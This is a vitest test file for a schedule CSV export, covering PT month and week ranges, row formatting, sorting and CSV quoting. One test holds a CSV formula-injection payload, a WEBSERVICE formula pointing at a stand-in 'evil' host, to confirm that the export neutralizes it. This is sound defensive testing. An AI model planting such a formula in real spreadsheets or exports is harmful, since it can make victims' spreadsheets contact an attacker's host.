import { describe, expect, it } from 'vitest'
import {
  resolveMonthRange,
  resolveWeekRange,
  buildScheduleRows,
  scheduleRowsToCsv,
  type ScheduleStreamInput,
} from './scheduleExport'

// The schedule export follows the same PT-naive convention as the rest of the
// app: a stream's UTC fields ARE its PT wall-clock. resolveMonthRange /
// resolveWeekRange produce ISO bounds whose UTC fields are PT calendar dates.

describe('resolveMonthRange', () => {
  it('spans the whole PT month (inclusive start, exclusive next-month start)', () => {
    const r = resolveMonthRange('2026-06')
    expect(r.fromISO).toBe('2026-06-01T00:00:00.000Z')
    expect(r.toExclusiveISO).toBe('2026-07-01T00:00:00.000Z')
    expect(r.fromKey).toBe('2026-06-01')
    expect(r.toKey).toBe('2026-06-30') // inclusive last day
  })

  it('rolls over December → January', () => {
    const r = resolveMonthRange('2026-12')
    expect(r.fromISO).toBe('2026-12-01T00:00:00.000Z')
    expect(r.toExclusiveISO).toBe('2027-01-01T00:00:00.000Z')
    expect(r.toKey).toBe('2026-12-31')
  })

  it('handles February in a leap year', () => {
    const r = resolveMonthRange('2028-02')
    expect(r.toKey).toBe('2028-02-29')
    expect(r.toExclusiveISO).toBe('2028-03-01T00:00:00.000Z')
  })

  it('rejects malformed or out-of-range month keys', () => {
    expect(() => resolveMonthRange('2026-13')).toThrow(RangeError)
    expect(() => resolveMonthRange('2026-00')).toThrow(RangeError)
    expect(() => resolveMonthRange('2026/06')).toThrow(RangeError)
    expect(() => resolveMonthRange('bad')).toThrow(RangeError)
  })
})

describe('resolveWeekRange', () => {
  it('spans Mon–Sun from a Monday start (exclusive following Monday)', () => {
    // 2026-06-15 is a Monday.
    const r = resolveWeekRange('2026-06-15')
    expect(r.fromISO).toBe('2026-06-15T00:00:00.000Z')
    expect(r.toExclusiveISO).toBe('2026-06-22T00:00:00.000Z')
    expect(r.fromKey).toBe('2026-06-15')
    expect(r.toKey).toBe('2026-06-21') // inclusive Sunday
  })

  it('spans a month boundary cleanly', () => {
    // Mon 2026-06-29 → Sun 2026-07-05.
    const r = resolveWeekRange('2026-06-29')
    expect(r.fromKey).toBe('2026-06-29')
    expect(r.toKey).toBe('2026-07-05')
    expect(r.toExclusiveISO).toBe('2026-07-06T00:00:00.000Z')
  })

  it('rejects malformed dates', () => {
    expect(() => resolveWeekRange('2026-06')).toThrow(RangeError)
    expect(() => resolveWeekRange('bad')).toThrow(RangeError)
  })
})

describe('buildScheduleRows', () => {
  const stream = (over: Partial<ScheduleStreamInput>): ScheduleStreamInput => ({
    start_time: '2026-06-17T12:00:00.000Z',
    end_time: '2026-06-17T14:00:00.000Z',
    host: { name: 'Alice' },
    moderator: { name: 'Bob' },
    ...over,
  })

  it('formats date, weekday, times, and duration in PT wall-clock', () => {
    const [row] = buildScheduleRows([stream({})])
    expect(row.dateKey).toBe('2026-06-17')
    expect(row.weekday).toBe('Wednesday')
    expect(row.start).toBe('12:00 PM')
    expect(row.end).toBe('2:00 PM')
    expect(row.durationHours).toBe('2.00')
    expect(row.host).toBe('Alice')
    expect(row.moderator).toBe('Bob')
  })

  it('renders blank cells for unassigned roles', () => {
    const [row] = buildScheduleRows([stream({ host: null, moderator: null })])
    expect(row.host).toBe('')
    expect(row.moderator).toBe('')
  })

  it('sorts chronologically by start time', () => {
    const rows = buildScheduleRows([
      stream({ start_time: '2026-06-20T10:00:00.000Z', end_time: '2026-06-20T11:00:00.000Z' }),
      stream({ start_time: '2026-06-03T10:00:00.000Z', end_time: '2026-06-03T11:00:00.000Z' }),
      stream({ start_time: '2026-06-10T10:00:00.000Z', end_time: '2026-06-10T11:00:00.000Z' }),
    ])
    expect(rows.map(r => r.dateKey)).toEqual(['2026-06-03', '2026-06-10', '2026-06-20'])
  })

  it('keeps a late-evening shift on its PT date (UTC fields ARE PT)', () => {
    // 23:30 "PT" stored as 23:30 UTC — must stay on the same calendar day.
    const [row] = buildScheduleRows([
      stream({ start_time: '2026-06-17T23:30:00.000Z', end_time: '2026-06-18T00:30:00.000Z' }),
    ])
    expect(row.dateKey).toBe('2026-06-17')
    expect(row.start).toBe('11:30 PM')
  })

  it('computes half-hour durations to two decimals', () => {
    const [row] = buildScheduleRows([
      stream({ start_time: '2026-06-17T12:00:00.000Z', end_time: '2026-06-17T13:30:00.000Z' }),
    ])
    expect(row.durationHours).toBe('1.50')
  })
})

describe('scheduleRowsToCsv', () => {
  const baseStream: ScheduleStreamInput = {
    start_time: '2026-06-17T12:00:00.000Z',
    end_time: '2026-06-17T14:00:00.000Z',
    host: { name: 'Alice' },
    moderator: { name: 'Bob' },
  }

  it('emits the header even with no rows', () => {
    expect(scheduleRowsToCsv([])).toBe(
      'Date,Weekday,Start,End,Duration (hrs),Host,Moderator',
    )
  })

  it('emits a header plus one line per row, no trailing newline', () => {
    const csv = scheduleRowsToCsv(buildScheduleRows([baseStream]))
    const lines = csv.split('\n')
    expect(lines).toHaveLength(2)
    expect(lines[1]).toBe('2026-06-17,Wednesday,12:00 PM,2:00 PM,2.00,Alice,Bob')
  })

  it('quotes name fields containing commas or quotes', () => {
    const csv = scheduleRowsToCsv(
      buildScheduleRows([{ ...baseStream, host: { name: 'Smith, "Jo"' } }]),
    )
    const line = csv.split('\n')[1]
    expect(line).toContain('"Smith, ""Jo"""')
  })

  it('neutralizes a formula-injection name in the schedule export (F5)', () => {
    const csv = scheduleRowsToCsv(
      buildScheduleRows([{ ...baseStream, host: { name: '=WEBSERVICE("http://evil")' } }]),
    )
    const line = csv.split('\n')[1]
    // rendered as text (leading '), and quoted because it contains a comma-free
    // formula with parens+quotes → the internal quotes force RFC-4180 quoting.
    expect(line).toContain('\'=WEBSERVICE(')
    expect(line).not.toMatch(/,=WEBSERVICE/) // never emitted as a bare live formula
  })
})
